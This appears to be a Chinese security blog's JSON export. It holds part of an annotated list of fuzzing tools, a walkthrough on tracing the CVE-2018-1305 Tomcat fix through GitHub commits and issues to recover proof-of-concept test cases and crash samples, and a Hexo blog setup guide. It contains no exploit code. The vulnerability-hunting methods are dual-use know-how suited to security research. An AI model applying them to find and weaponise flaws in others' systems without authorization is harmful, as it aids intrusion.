lop）http://lcamtuf.coredump.cx/afl/Afl-fuzz是一种基于面向安全的模糊测试工具，它采用了一种新型的方式（编译时检测和遗传算法），来自动发掘干净的、有趣的测试案例，即在目标二进制中触发新的内部状态。这基本上改善了模糊代码的功能覆盖。该工具生成的简洁的合成语料库也可以用来传播其它更多的劳动型或资源密集型测试方案。与其他仪器化的模糊工具相比，afl-fuzz是以实用性而被设计的：它具有适度的性能开销，采用了多种高效的模糊战略，和努力最小化的技巧，基本上不需要配置，并且能够无缝处理复杂的、真实世界案例，以及常见的图像分析或文件压缩等。 Filebuster一个非常快速和灵活的网络模糊工具 TriforceAFLAFL / QEMU 模糊器具有全系统的仿真。这是AFL的修补版本，支持使用QEMU的全系统模糊测试。它所包含的QEMU已经更新，允许在运行x86_64的系统仿真器时进行分支机构跟踪。它也添加了额外的指令来启动AFL的forkserver，进行模糊设置，并标记测试用例的启动和停止。 Nightmare:https://github.com/joxeankoret/nightmare一个具有web管理的分布式模糊测试套件。 GrrDECREE二进制的高吞吐量模糊器和仿真器 Randy:http://ptrace-security.com/blog/randy-random-based-fuzzer-in-python/Python中的基于随机的模糊工具 IFuzzer一个进化型的翻译模糊器 Dizzy:https://github.com/ernw/dizzy基于python的模糊框架：(1) 可以发送到L2以及上层（TCP / UDP / SCTP）(2)能够处理奇长度分组字段（无需匹配字节边界，因此即使单个标志或7位长字也可以表示和模糊）(3) 非常容易的协议定义语法(4) 能够做多包状态的完全模糊，能够使用接收到的目标数据作为响应 Address Sanitizer:https://github.com/Google/sanitizers地址Sanitizer、线Sanitizer、记忆Sanitizer Diffy:https://github.com/twitter/diffy使用Diffy查找您的服务中的潜在错误 Wfuzz:https://github.com/xmendez/wfuzzWeb应用程序HTTP://www.edge-security.com/wfuzz.php Go-fuzz:https://github.com/Google/gofuzz基于放弃的模糊测试 Sulley:https://github.com/OpenRCE/sulleySulley是一个积极开发的模糊引擎和模糊测试框架，由多个可扩展组件组成。Sulley（IMHO）超过了此前公布的大所属模糊技术、商业和公共领域的能力。框架的目标是不仅是可以简化数据表示，而且也可以简化数据传输和仪表。Sulley是以 Monsters Inc.的生物来命名的，因为，他是模糊的。写在python内的。 Sulley_l2:http://ernw.de/download/sulley_l2.tar.bz2有些人可能记得2008年发布的sulley_l2，它是sulley模糊框架的修改版本，增强了第2层发送功能和一堆（L2）模糊脚本。所有的blinking, rebooting, mem-corrupting引起了我们的一些关注。从那以后，我们继续写和使用这些模糊脚本，所以它的洞集合增长了。 CERT Basic Fuzzing Framework (BFF)For linux, OSXhttps://github.com/CERTCC-Vulnerability-Analysis/certfuzzhttp://www.cert.org/vulnerability-analysis/tools/bff.cfmcert基本模糊框架（BFF）是一个软件测试工具，它用于在linux和mac os x平台上运行的应用程序中寻找漏洞。BFF对消耗文件输入的软件执行突变性的模糊测试。（突变性模糊测试是采取形式良好的输入数据并以各种方式破坏它的行为，寻找导致崩溃的情况。）BFF自动收集导致了软件以独特方式使测试用例崩溃，以及利用崩溃来调试信息。BFF的目标是去最小化软件供应商和安全研究人员通过模糊测试有效地发现和分析发现的安全漏洞过程中所需要的努力。 CERT Failure Observation Engine (FOE)For windowshttp://www.cert.org/vulnerability-analysis/tools/foe.cfmhttps://github.com/CERTCC-Vulnerability-Analysis/certfuzzThe cert Failure Observation Engine (FOE) 是一个软件测试工具，它被用于在Windows平台上运行的应用程序中发现漏洞。FOE在消耗文件输入的软件上执行突变模糊测试。（突变性模糊测试是采取形式良好的输入数据并以各种方式破坏它的行为，寻找导致崩溃的情况。）FOE自动收集导致了软件以独特方式使测试用例崩溃，以及利用崩溃来调试信息。FOE的目标是去最小化软件供应商和安全研究人员通过模糊测试有效地发现和分析发现的安全漏洞过程中所需要的努力。 DranzerFor ActiveX Controls.https://github.com/CERTCC-Vulnerability-Analysis/dranzerDranzer是一个工具，使用户能够检查有效的技术，它用于模糊测试ActiveX控件 Radamsaa general purpose fuzzerhttps://github.com/aoh/radamsaRadamsa是一个用于鲁棒性测试的测试用例生成器，也称为fuzzer。它可以用来测试一个程序是否可以承受格式错误以及潜在的恶意输入。它通过制造文件来工作（有趣的不同于通常给定的文件），然后将修改的文件提供给Target程序，或者这样或通过一些脚本。radamsa的主要卖点（而不是其他的模糊器）是：它是非常容易在大多数机器上运行，而且很容易从命令行脚本，这已经被用来找到程序中的一系列安全问题，而且你可能现在正在使用。 zzufApplication fuzzerhttps://github.com/samhocevar/zzufzzuf是一个透明的应用程序输入模糊器。 它的工作原理是截取文件操作并更改程序输入中的随机位。zzuf的行为是确定性的，使得它很容易再现错误。 有关如何使用zzuf的说明和示例，请参阅手册页和网站http://caca.zoy.org/wiki/zzuf Backfuzzhttps://github.com/localh0t/backfuzzBackfuzz是一个用python写成的有着不同协议（FTP，HTTP，IMAP等）的模糊工具。因为一般的想法是这个脚本有几个预定义的功能，所以谁想要编写自己的插件（为另一个协议）就可以在一些行这样做。 KEMUfuzzerhttps://github.com/jrmuizel/kemufuzzerKEmuFuzzer是一个基于仿真或直接本地执行测试系统虚拟机的工具。 目前KEmuFuzzer支持：BHOCS，QEMU，VMware和virtualbox。 Pathgrindhttps://github.com/codelion/pathgrindPathgrind使用基于路径的动态分析来fuzz linux / unix二进制。 它是基于valgrind被写在python内的。 Wadi-fuzzerhttps://www.sensepost.com/blog/2015/wadi-fuzzer/ https://gitlab.sensepost.com/saif/DOM-FuzzerWadi是基于web浏览器语法的模糊器。 这个语法用于描述浏览器应该如何处理Web内容，Wadi转向并使用语法来打破浏览器。Wadi是一个Fuzzing模块，用于NodeFuzz fuzzing Harness并利用AddressSanitizer（ASan）在Linux和Mac OSX上进行测试。万维网联盟（W3C）是一个国际组织，它开发开放标准以确保Web的长期增长。 W3C允许我们搜索语法并在我们的测试用例中使用。 LibFuzzer, Clang-format-fuzzer, clang-fuzzerhttp://llvm.org/docs/LibFuzzer.htmlhttp://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-format/fuzzer/ClangFormatFuzzer.cpp?view=markuphttp://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-fuzzer/ClangFuzzer.cpp?view=markup我们在LibFuzzer上实现了两个模糊器：clang-format-fuzzer和clang-fuzzer。Clang格式大多是一个词法分析器，所以给它随机字节格式是会完美运行的，但也伴随着超过20个错误。然而Clang不仅仅是一个词法分析器，给它随机字节时几乎没有划伤其表面，所以除了测试随机字节，我们还在令牌感知模式中模糊了Clang。两种模式中都发现了错误; 其中一些以前被AFL检测到，另一些则不是：我们使用AddressSanitizer运行这个模糊器，结果发现一些错误在没有它的情况下不容易被发现。 Perf-fuzzerhttp://www.eece.maine.edu/~vweaver/projects/perf_events/validation/https://github.com/deater/perf_event_testshttp://web.eece.maine.edu/~vweaver/projects/perf_events/fuzzer/用于Linux perf_event子系统的测试套件 HTTP/2 Fuzzerhttps://github.com/c0nrad/http2fuzzHTTP2模糊器内置于Golang。 QuickFuzzhttp://quickfuzz.org/QuickFuzz是一个语法模糊器，由QuickCheck，模板Haskell和Hackage的特定库生成许多复杂的文件格式，如Jpeg，Png，Svg，Xml，Zip，Tar和更多！ QuickFuzz是开源的（GPL3），它可以使用其他错误检测工具，如zzuf，radamsa，honggfuzz和valgrind。 SymFuzzhttps://github.com/maurer/symfuzzhttp://ieeexplore.IEEE.org/xpls/abs_all.jsp?arnumber=7163057摘要？我们提出了一个算法的设计，以最大化数量的bug为黑盒子突变性的模糊给定一个程序和种子的输入。主要的直观性的是利用给定程序 - 种子对的执行轨迹上的白盒符号进行分析，来检测输入的BIT位置之间的依赖性，然后使用这种依赖关系来为该程序种子对计算概率上最佳的突变比率。我们的结果是有希望的：我们发现使用相同的模糊时间，这比8个应用程序中的三个以前的模糊器的平均错误多38.6％。 OFuzzhttps://github.com/sangkilc/ofuzzOFuzz是一个用OCaml编写的模糊平台。 OFuzz目前专注于在* nix平台上运行的文件处理应用程序。 OFuzz的主要设计原则是灵活性：必须容易添加/替换模糊组件（崩溃分类模块，测试用例生成器等）或算法（突变算法，调度算法）。 Bedhttp://www.snake-basket.de/网络协议fuzzer。 BED是一个程序，旨在检查守护程序的潜在缓冲区溢出、格式字符串等。 Neural Fuzzerhttps://cifasis.github.io/neural-fuzzer/神经模糊测试工具是一种实验性模糊器，它被设计使用国家最先进的机器，从一组初始文件学习。 它分为两个阶段：训练和生成。 Pulsarhttps://github.com/hgascon/pulsar协议学习，模拟和状态模糊器Pulsar是一个具有自动协议学习和模拟能力的网络模糊器。该工具允许通过机器学习技术来建模协议，例如聚类和隐马尔可夫模型。这些模型可以用于模拟Pulsar与真实客户端或服务器之间进行通信，这些消息，在一系列模糊原语的结合下，让测试一个未知协议错误的实施在更深的状态协议。 D-bus fuzzer:https://github.com/matusmarhefka/dfuzzerdfuzzer是D-Bus模糊器，是用于通过D-Bus进行通信的模糊测试过程的工具。它可以用于测试连接到会话总线和系统总线守护程序的进程。模糊器为客户端工作，它首先连接到总线守护进程，然后它遍历并模糊测试由D-Bus服务提供的所有方法。 Choronzonhttps://census-labs.com/news/2016/07/20/choronzon-public-release/Choronzon是一个进化型的模糊工具。它试图模仿进化过程，以保持产生更好的结果。 为了实现这一点，它具有评估系统的能力，用以分类哪些模糊文件是有趣的，哪些应该被丢弃。此外，Choronzon是一个基于知识的模糊器。 它使用用户定义的信息来读取和写入目标文件格式的文件。要熟悉Choronzon的术语，您应该考虑每个文件由染色体表示。用户应该描述所考虑的文件格式的基本结构， 优选文件格式的高级概述，而不是描述它的每个细节和方面。那些用户定义的基本结构中的每一个都被认为是基因， 每个染色体包含一个基因树，并且它能够从中构建相应的文件。 Exploitable ‘exploitable’是一个GDB扩展，它会按严重性分类Linux应用程序错误。扩展检查已崩溃的Linux应用程序的状态，并输出攻击者利用底层软件错误获得系统控制有多困难的总结。扩展可以用于为软件开发人员确定bug的优先级，以便他们可以首先解决最严重的bug。该扩展实现了一个名为“exploitable”的GDB命令。 该命令使用启发式来描述当前在GDB中调试的应用程序的状态的可利用性。 该命令旨在用于包含GDB Python API的Linux平台和GDB版本。 请注意，此时命令将无法在核心文件目标上正确运行。 Hodor 我们想设计一个通用的模糊器，可以用来配置使用已知的良好的输入和分隔符，以模糊特定的位置。在一个完全愚钝的模糊器和一些更聪明的东西之间，与实现适当的智能模糊器相比，表现着更少的努力。 BrundleFuzzhttps://github.com/carlosgprado/BrundleFuzzBrundleFuzz是一个用于Windows和Linux的分布式模糊器，使用动态二进制仪器。 Netzobhttps://www.netzob.org/用于通信协议的逆向工程、流量生成和模糊化的开源工具 PassiveFuzzFrameworkOSX该框架用于在内核模式下基于被动内联挂钩机制来模糊OSX内核漏洞。 syntribosOpenStack安全组的Python API安全测试工具 honggfuzzhttp://google.github.io/honggfuzz/一个通用的，易于使用的有趣的分析选项的模糊器。 支持基于代码覆盖率的反馈驱动的模糊测试 dotdotpwnhttp://dotdotpwn.blogspot.com/目录遍历模糊工具 KernelFuzzer跨平台内核Fuzzer框架。DEF CON 24视频：https://www.youtube.com/watch?v=M8ThCIfVXow PyJFuzzPyJFuzz - Python JSON FuzzerPyJFuzz是一个小的、可扩展的和现成可用的框架，用于模糊JSON输入，如移动端点REST API，JSON实现，浏览器，cli可执行和更多。 RamFuzz单个方法参数的模糊器。 EMFFuzzer基于桃树模糊框架的增强的元文件模糊器 js-fuzz一个基于javascript的AFL启发的遗传模糊测试器。 syzkallersyzkaller是一个无监督的、覆盖引导的Linux系统调用模糊器。 二、模糊线束/框架使fuzzer提高： FuzzFlowFuzzflow是来自cisco talos的一个分布式的模糊管理框架，它提供虚拟机管理，模糊作业配、可插拔变异引擎、前/后变形脚本、崩溃收集和可插拔崩溃分析。 fuzzinatorFuzzinator是一个模糊测试框架，可以帮助你自动化任务，它通常需要在一个fuzz会话：运行您最喜欢的测试生成器并将测试用例馈送到测试中的系统，抓住和保存独特的问题，减少失败的测试用例，缓解错误跟踪器中的问题报告（例如，Bugzilla或GitHub），如果需要，定期更新SUT计划多个SUT和发电机，而不会使工作站超载。 Fuzzlabshttps://github.com/DCNWS/FuzzLabsFuzzLabs在一个模块化的模糊框架中，用Python编写。 它使用了令人惊叹的Sulley模糊框架的修改版本作为核心引擎。 FuzzLabs仍在开发中。 Nodefuzzhttps://github.com/attekett/NodeFuzz对于Linux和Mac OSX。 NodeFuzz是一个用于网络浏览器和类似浏览器的应用程序的模糊器。 NodeFuzz背后有两个主要的想法：第一是创建一个简单、快速、不同浏览器的fuzz方法。 第二，有一个线束，可以轻松地扩展与新的测试用例发生器和客户端仪器，无需修改核心。 Grinderhttps://github.com/stephenfewer/grinder对于windows Grinder是一个自动化浏览器的模糊化和大量崩溃管理的系统。 Kittyhttps://github.com/Cisco-sas/kittyKitty是一个开源的模块化和可扩展的模糊框架，使用python编写，灵感来自OpenRCE的Sulley和Michael Eddington（现在是Deja vu Security的）Peach Fuzzer。 Peachhttp://community.peachfuzzer.com/https://github.com/MozillaSecurity/peachPeach是一个SmartFuzzer，能够执行基于生成和基于突变的模糊测试。 三、此外，还有这些免费的但不是开源的fuzzer： SDL MiniFuzz File Fuzzerhttps://www.Microsoft.com/en-us/download/details.aspx?id=21769对于Windows。 SDL MiniFuzz File Fuzzer是一个基本的文件模糊工具，旨在简化非安全开发人员对模糊测试的采用，这些非安全开发人员不熟悉文件模糊工具或从未在当前的软件开发过程中使用它们。 Rfuzzhttp://rfuzz.rubyforge.org/index.htmlRFuzz是一个Ruby库，可以使用快速HttpClient和wicked vil RandomGenerator轻松地从外部测试Web应用程序，它允许普通程序员每天使用先进的模糊技术。 Spikehttp://www.immunitysec.com/downloads/SPIKE2.9.tgzSPIKE是一个API框架，允许你编写模糊器。 Regex Fuzzerhttp://go.microsoft.com/?linkid=9751929DL Regex Fuzzer是一个验证工具，用于帮助测试正则表达式是否存在潜在的拒绝服务漏洞。它包含用指数时间执行的某些子句的正则表达式模式（例如，包含自身重复的重复的子句）可以被攻击者利用来引起拒绝服务（DoS）条件。SDL Regex Fuzzer与SDL过程模板和MSF-Agile + SDL过程模板集成，以帮助用户跟踪和消除其项目中的任何检测到的正则表达式漏洞。 四、博客，将帮助你fuzz更好 Yawml的开始到完成模糊与AFL（一个完整的fuzzjob由foxglovesecurity）http://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/ Fuzz更聪明，更难 - 用afl引发模糊，来自bsidessf2016的引物https://www.peerlyst.com/posts/bsidessf-2016-recap-of-fuzz-smarter-not-harder-an-afl-primer-claus-cramon Fuzzing和afl是一种艺术Fuzzing nginx 和 American Fuzzy Lop您可以在此处的评论或此Google文档中发表建议：https://docs.google.com/document/d/17pZxfs8hXBCnhfHoKfJ7JteGziNB2V_VshsVxmNRx6U/edit?usp=sharing BSidesLisbon 2016主题演讲：智能模糊器革命Windows内核模糊初学者 - Ben Nagy 五、其他Fuzzer博客：循环使用编译器转换的模糊包版谷歌推出了OSS-Fuzz（感谢Dinko Cherkezov） - 一个项目，旨在不断开发开源项目fuzz：OSS-Fuzz现在正在测试中，并即将接受候选开源项目的建议。为了使项目被OSS-Fuzz接受，它需要有一个庞大的用户基础或针对于至关重要的全球IT基础设施，这是一个通用启发式方法，我们有意在这个早期阶段解释。查看更多详情和说明如何在这里申请。一旦项目注册了OSS-Fuzz，它将自动接收到我们的跟踪器中，新报告的错误披露截止于90天后（见此处的详细信息）。 这符合行业的最佳实践，并通过更快地为用户提供补丁来提高最终用户的安全性和稳定性。帮助我们确保这个程序真正服务于开源社区和依赖这个关键软件的互联网，贡献和留下您的反馈在GitHub。 六、商业模糊器 超越安全的暴风雨http://www.beyondsecurity.com/bestorm_and_the_SDL.html管理员编辑：查找更多真棒Peerlyst社区贡献的资源，资源目录在这里。 七、关于浏览器的Fuzzing Skyfire 一种用于Fuzzing的数据驱动的种子生成工具https://www.inforsec.org/wp/?p=2678https://www.ieee-security.org/TC/SP2017/papers/42.pdf 使用libFuzzer fuzz Chrome V8入门指南http://www.4hou.com/info/news/6191.html","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://maskhed.github.io/categories/漏洞分析/"}],"tags":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://maskhed.github.io/tags/Fuzz/"}]},{"title":"利用Github辅助漏洞分析","slug":"利用Github辅助漏洞分析","date":"2018-10-26T15:58:57.000Z","updated":"2018-11-27T13:31:27.457Z","comments":true,"path":"2018/10/26/利用Github辅助漏洞分析/","link":"","permalink":"http://maskhed.github.io/2018/10/26/利用Github辅助漏洞分析/","excerpt":"","text":"来自于lcatro师傅的分享，原文地址如下：https://github.com/lcatro/How-to-Read-Source-and-Fuzzing/blob/master/1.Github.md 必备工具 Git ,Github 从Github 开始 Github 是代码分享平台,使用Github 能够找到很多开源项目,关于Github 不多做介绍了,下面分享些使用Github 读代码的操作 Github commits Github commits 的功能是用来记录每一次Git 提交代码的信息,里面包含了修改代码的原因,还有修改了哪些代码.Github commits 的功能在这里 点击之后,可以看到很多Git 提交代码的记录 随意点开一条记录,可以看到很多关于这条Commit 的信息 使用Github commits 有一个操作就是:一般来说,部分安全告警或者存在特别严重漏洞的开源项目向外发出通知的时候,往往只是提醒漏洞是影响了哪些版本,什么时候修复,要更新到最新的版本.关于漏洞的详情是很少提及的,甚至PoC 也没有.那么这个时候要怎么去研究漏洞呢?答案是追踪Commit 提交记录 以CVE-2018-1305 为例子,关于绿盟的对外的通告如下(其他通告都大同小异): 里面只有一个邮件通信记录,我们进去看看有什么(https://lists.apache.org/thread.html/d3354bb0a4eda4acc0a66f3eb24a213fdb75d12c7d16060b23e65781@%3Cannounce.tomcat.apache.org%3E) 邮件最下面有个References ,翻译为中文是引用的意思,在这里多插一句话:文章里面的引用一般是拓展阅读或者理论/数据的来源依据,如果读者需要进一步去深入这个文章,引用来源就是最好的入手点**.我们挑其中一个引用的URL 来看看(http://tomcat.apache.org/security-9.html),下面是我挑出的重点信息 圆圈里的意思是漏洞的描述,方框里标明的是其他有用的信息:影响的版本(Affects: 9.0.0.M1 to 9.0.4),最新修复的版本号(Fixed in Apache Tomcat 9.0.5),公开漏洞的时间(11 February 2018),Commit ID (This was fixed in revisions 1823310 and 1824323.). 找到Commit ID ,点进去看看,这个时候就跳转到了Apache 的SVN Commit 记录里边了(http://svn.apache.org/viewvc?view=revision&amp;revision=1823310).[PS:SVN 和Git 都是版本管理工具] 我们可以看到这次修复漏洞修改了哪些代码.但是点进去代码里看,也没有diff ,所以现在回到Git commits 里继续找修复代码的Commit .那么要怎么去找Commit 呢?这个时候,漏洞修复时间就派上用场了. SVN 的Commit 里面有一个Commit 时间(如果没有找到对应的Commit ,就在漏洞报告时间(2018/2/1)到漏洞公开时间(2018/2/23)搜索Commit ) 然后去找Commit ,发现没有找到 这就很迷了,为啥会找不到呢.读者们回到主页,点击这里 这个时候,漏洞影响版本号就派上用场了,嘿嘿嘿 …这里找了个遍都没有找到这个版本,太神奇了,咱们再细细看看漏洞信息哈 ??? 难道tomcat 和apache 是不同的?那我去搜索一下tomcat [PS:Github 搜索有很多很有趣的使用套路,待会和大家分享一个学习漏洞原理的骚操作] 看来找错了开源项目,那就先看看版本分支吧 有些开源项目是有设置不同的版本分支管理的,没有也没关系,那就来找Commit 吧 现在已经定位到了2018/2/6 号的Commit 信息,这里有几个Commit ,一个一个慢慢看吧,搜素的过程就不多说了,最后定位到这两个Commit 修复代码:https://github.com/apache/tomcat/commit/3e54b2a6314eda11617ff7a7b899c251e222b1a1 测试用例:https://github.com/apache/tomcat/commit/af0c19ffdbe525ad690da4fd7e988c7788d00141 在Git 的Commit 里还能看到Diff ,很容易就知道到底哪些代码被修改过(包括代码注释) 在测试用例里面就可以直接找到PoC 了 Github Search 前面已经说到了如何使用Commit 了,相信读者也已经去秀了一波操作,找到更多关于漏洞修复的细节,上一节有提到,关于Github Search 有一个学习代码的骚操作,当年我就是用这一招弄明白了JavaScript 这种脚本解析引擎的漏洞应该要怎么挖,是不是很想知道到底是啥套路. 在搜索框里输入CVE ,记住,要想挖哪个开源项目就去那个开源项目的Github 上搜素CVE 三个字 结果如上,这个是Code 搜素,搜素出来的结果比较少,咱们切换到Commits 来看看 是不是发现了新世界 :) 洞海无涯苦作舟,用这种方法可以从issus 和Commit 里面学到很多,但是要看懂整个Commit 不只是要看Diff ,还要下载代码到本地一步一步分析漏洞成因 Github Issus Issus 可以看到很多漏洞挖掘的操作,特别是AFL 和libFuzzer 的怎么样使用的,同时在这些提交漏洞的Issus 里还能收集到很多样本,可以直接拿下来到其他的开源项目里继续使用,举个例子,ImageMagick 的Issus :https://github.com/ImageMagick/ImageMagick/issues 这里告诉大家样本在哪儿可以下载,重点是触发的命令是什么,有了这个触发命令之后,我们也可以去照猫画虎拿到AFL 里去跑Fuzzing 啦,美滋滋 在Github 上读代码 一般我都是先在Github 上阅读代码,然后再下载代码到本地Source Insight 继续读.我们有两种方式在Github 上开始阅读 根据文件夹来阅读 简单地来说:关注文件/文件夹的名字 多翻一下目录和文件,总会遇到你感兴趣的一个地方来读 根据敏感函数来阅读 善用Github 的搜索功能,它能够帮你搜索代码或者其他信息 找到了一个感兴趣的地方开始阅读代码之后,Github 的搜素功能可以帮助你向上回溯代码 在网页和普通编辑器阅读源码记得要多使用Ctrl + F ,它能够帮你快速定位当前代码文件的函数定位 Git Clone 这个就不多介绍了,下载代码到本地 Example 去年挖到一个蚂蚁矿机的远程代码执行漏洞,发现这个问题是直接在Github 上读代码的找到的,附上源码分析.","categories":[{"name":"技术分享","slug":"技术分享","permalink":"http://maskhed.github.io/categories/技术分享/"}],"tags":[{"name":"Github","slug":"Github","permalink":"http://maskhed.github.io/tags/Github/"}]},{"title":"Hexo 搭建个人博客","slug":"Hexo博客搭建","date":"2018-10-21T14:09:55.000Z","updated":"2018-11-27T13:32:54.893Z","comments":true,"path":"2018/10/21/Hexo博客搭建/","link":"","permalink":"http://maskhed.github.io/2018/10/21/Hexo博客搭建/","excerpt":"积淀的意义不言而喻，希望能借助这个精神世界的自留地，沉淀所思所学，见证自己一步步走过的历程。","text":"积淀的意义不言而喻，希望能借助这个精神世界的自留地，沉淀所思所学，见证自己一步步走过的历程。 0x00 准备工作Hexo 是一个基于 Node.js 的静态博客框架，具有极速生成静态页面、支持Markdown、一键部署、插件丰富等优点。在使用 Hexo 之前，需要进行以下准备工作。 安装 Node.js，用以生成静态页面 安装 Git，用以提交管理博客 注册 Github 账号，并开启 Github Pages 服务 掌握 Markdown 语法，用以管理站点内容 以上内容资料较为丰富，因此不再赘述，如有需求请自行 Google。 0x01 Hexo1. 安装通过以下命令，一键安装 Hexo1npm install hexo -g 待安装完成后，创建用以存放 hexo 文件的目录，并初始化123mkdir hexocd hexohexo init 初始化成功后，目录结构如下：12345678.├── _config.yml├── package.json├── scaffolds├── source└── themes3 directories, 2 files 2. 常用命令123456789101112131415$ hexo server 开启hexo服务器$ hexo s$ hexo s --draft 显示草稿$ hexo new \"name\" 新建文章$ hexo new draft \"name\" 新建草稿$ hexo publish \"name\" 发布草稿$ hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public)$ hexo generate 生成静态页面$ hexo g$ hexo deploy 部署博客到Github$ hexo d 3. Hexo 配置通过/_config.yml文件可对 Hexo 进行配置，官方文档中有详细介绍，不再赘述，详情可参考配置。 4. 添加文章摘要设置文章摘要有两种方法： 在 Front-matter 中指定 description，如： 12345678910title: Hello Worlddate: 2013-11-22 17:11:54description: 你对本页的描述``` * 在正文使用 `&lt;!--more--&gt;` 作为摘要的结束标记```bash以上是摘要 &lt;!--more--&gt;以下是剩下的全文 5. 自定义 404 、about 页面 在 hexo/source 目录下创建 404.html 文件 或者 404.md 文件，以 404.html 为例接入腾讯404公益广告。 123456789101112layout: falsetitle: \"404\"---&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt; &lt;script type=\"text/javascript\" src=\"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://&lt;your home page&gt;\" homePageName=\"回到首页\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 在 hexo/source/about/ 目录下创建 index.md文件，添加内容如下： 1234567891011---title: about---Coming soon ~``` ### 6. 创建分类及标签 6.1 创建“分类”选项打开命令行，进入博客所在目录。执行以下命令```bash$ hexo new page NewCategories 成功后提示：1INFO Created: ~/Documents/blog/source/NewCategories/index.md 生成的index.md内容如下：1234---title: 文章分类date: 2018-10-20 13:47:40--- 向文件中添加type: &quot;categories&quot;，结果如下：12345---title: 文章分类date: 2018-10-20 13:47:40type: \"categories\"--- 打开需要添加分类的文章，为其添加categories属性。下方的categories: web前端表示添加这篇文章到“web前端”这个分类。123456---title: jQuery对表单的操作及更多应用date: 2018-10-20 13:47:40categories:- web前端--- 至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了categories: xxx的文章才会被收录到首页的“分类”中。 6.2 创建“标签”选项打开命令行，进入博客所在文件夹。执行命令1$ hexo new page NewTags 成功后会提示：1INFO Created: ~/Documents/blog/source/NewTags/index.md 打开index.md文件，内容如下：1234---title: 标签date: 2017-05-27 14:22:08--- 添加type: &quot;tags&quot;至index.md中：12345---title: 文章分类date: 2017-05-27 13:47:40type: \"tags\"--- 打开需要添加标签的文章，为其添加tags属性。12345678910---title: jQuery对表单的操作及更多应用date: 2017-05-26 12:12:57categories:- web前端tags:- jQuery- 表格- 表单验证--- 至此，成功给文章添加标签，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了tags: xxx的文章才会被收录到首页的“标签”中。 修改scaffolds/post.md模板文件，在 Front-matter 区域添加tages:、categories:：123456---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories:tags:--- 之后执行hexo new 文章名命令生成的文件，将会自动添加“分类”与“标签”。 7. SEO优化Hexo 站点已基本搭建完成。但是如果仅仅搭建完毕是无法通过搜索引擎查询到的，若想要加入搜索引擎收录，需进行 SEO 优化。7.1 添加搜索引擎收录分别在 百度站长工具 和 Google 站长工具 中对站点进行验证。 选择文件验证的方式进行验证，把下载的文件放在 source 目录下，并对文件内容进行编辑，在文件首部加入如下内容：1234---layout: falsesitemap: false--- 这样就可以防止 Hexo 在生成博客网站时在验证文件里添加额外的内容，导致验证失败。也可以在博客的配置文件里加入如下的配置来防止这些文件被渲染：123skip_render: - baidu_verify*.html - google*.html 7.2 添加robots.txt在/source/下新建robots.txt：123456789101112131415161718User-agent: *Allow: /Allow: /archives/Allow: /about/Allow: /categories/Allow: /donate/Allow: /2017/Allow: /history/Allow: /message/Allow: /page/Allow: /tags/Disallow: /vendors/Disallow: /vendors/Disallow: /fancybox/Sitemap: https://domain/sitemap.xmlSitemap: https://domain/baidusitemap.xml 7.3 提交 sitemaps利用插件生成sitemap（详见下文），待站点验证成功后便可以选择用 sitemap 的方式自动提交链接。提交完成后可以通过 site:your-blog-site 验证站点是否被百度、Google 收录。 一般需要几天的时间才能保证被搜索引擎收录。 0x02 MaupassantHexo官网提供了丰富的 Themes，选定心仪的主题之后，可以参照主题的文档进行安装，之后修改/_conifg.yml进行配置，本站选用了Maupassant。 1. Maupassant 安装安装主题和渲染器：123$ git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant$ npm install hexo-renderer-pug --save$ npm install hexo-renderer-sass --save 编辑Hexo目录下的 _config.yml，将theme的值改为maupassant。 注：安装npm install hexo-renderer-sass时报错，切换至淘宝NPM镜像安装即可。 2. Maupassant配置官方文档中有详细介绍，可参考中文介绍。 3. 显示文章目录在文章的 Front-matter 中添加toc: true就可以让该篇文章显示目录，可以修改 hexo/scaffolds/post.md 模板文件，这样之后创建的文章默认都显示文章目录。1234567---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories:tags:toc: true--- 4. 开启 canvas-nest 网页动态背景修改/themes/maupassant/_config.yml:123456canvas_nest: enable: true color: 208,55,66 ## RGB value of the color opacity: 0.3 ## Transparency of lines zIndex: -1 ## The z-index property of the background count: 99 ## Quantity of lines 5. 设置导航栏menu修改/themes/maupassant/_config.yml:12345678910111213141516menu: - page: home directory: . icon: fa-home - page: archive directory: archives/ icon: fa-archive - page: about directory: about/ icon: fa-user - page: history directory: history/ icon: fa-user - page: rss directory: atom.xml icon: fa-rss 6. 为导航添加相应的页面（时间轴等） 在/source下新建与page名称对应的文件夹，然后在文件夹中建立index.md文件； 在index.md的front-matter中设置属性，若需要含有侧边栏的页面，添加layout: page；若需要单栏页面，就将layout设置为 layout: single-column；若不需要评论，需要加上comments: false 若要显示时间轴，在index.md的front-matter中设置layout属性为layout: timeline，同时修改/themes/maupassant/_config.yml: 123456789timeline: - num: 1 word: 2014/06/12-Start - num: 2 word: 2014/11/29-XXX - num: 3 word: 2015/02/18-DDD - num: 4 word: More /source/history/index.md：1234---layout: timelinecomments: false--- 0x03 常用插件1. hexo-wordcount安装插件1$ npm install hexo-wordcount —save 开启 Maupassant 主题中的 Word Count 功能：1wordcount: true ## If you want to display the word counter and the reading time expected to spend of each post please set the value to true, and you must have hexo-wordcount installed. 2. hexo-generator-search启用 Maupassant 本地搜索功能，安装hexo-generator-search1npm install hexo-generator-search --save 安装完成后，修改主题配置，显示本地搜索框1self_search: true ## Use a jQuery-based local search engine, true/false. 3. hexo-asset-imagehexo对本地图片的支持并不友好，如果按markdown的语法写部署之后页面的图片取不到，如果按hexo的写法在本地markdown编辑器中又不能识别，解决办法是使用 hexo-asset-image 插件。首先安装插件1$ npm install hexo-asset-image —save 然后修改 _config.yml 中 post_asset_folder 的值为 true，这样每次创建文章的时候会生成一个同名文件夹用于放资源文件，这样就可以使用markdown的语法来插入图片了。 